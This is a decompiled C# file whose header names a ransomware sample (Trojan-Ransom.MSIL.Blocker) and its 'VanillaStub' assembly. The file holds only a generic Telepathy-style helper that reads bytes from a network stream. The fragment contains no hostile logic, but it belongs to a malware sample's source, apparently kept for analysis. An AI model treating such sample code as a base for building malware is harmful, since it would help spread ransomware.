// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Telepathy.NetworkStreamExtensions
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System.IO;
using System.Net.Sockets;

namespace VanillaStub.Helpers.Telepathy
{
  public static class NetworkStreamExtensions
  {
    public static int ReadSafely(this NetworkStream stream, byte[] buffer, int offset, int size)
    {
      try
      {
        return stream.Read(buffer, offset, size);
      }
      catch (IOException ex)
      {
        return 0;
      }
    }

    public static bool ReadExactly(this NetworkStream stream, byte[] buffer, int amount)
    {
      int num;
      for (int offset = 0; offset < amount; offset += num)
      {
        int size = amount - offset;
        num = stream.ReadSafely(buffer, offset, size);
        if (num == 0)
          return false;
      }
      return true;
    }
  }
}
